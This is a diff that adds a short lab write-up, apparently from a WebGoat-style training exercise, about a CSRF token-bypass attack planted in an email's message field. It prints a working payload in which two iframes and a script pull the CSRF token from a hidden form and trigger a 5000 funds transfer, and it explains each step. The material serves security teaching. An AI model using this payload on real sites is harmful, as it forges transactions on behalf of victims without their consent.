@@ -1,0 +1,18 @@
+The attack targets at the message field of the email and the code that creates the expoloir is shown below:
+
+<script>
+function make_transaction()
+{
+    var frameContent = document.getElementById("if2").contentDocument;
+    var form = frameContent.getElementsByTagName("form")[0];
+    document.getElementById('if1').src='attack?Screen=XXX&menu=YYY&transferFunds=5000'+'&CSRFToken=' + form.CSRFToken.value;
+}
+</script>
+<iframe id="if1" width="500" height="300">
+</iframe>
+<iframe id="if2" src="attack?Screen=XXX&menu=YYY&transferFunds=main" width="500" height="300" onload="make_transaction();">
+</iframe>
+
+
+For this attack, we create two iframe elements in the body of the email message where the first one has an empty src field and the second one points to the page where it prompts the user to enter an amount and uses the token to authenticate. Upon the successful load of the second iframe, it triggers the make_transaction() method which obtains the CSRFToken from its HTML content and sets the src attribute of the first iframe to complete the transaction.
+
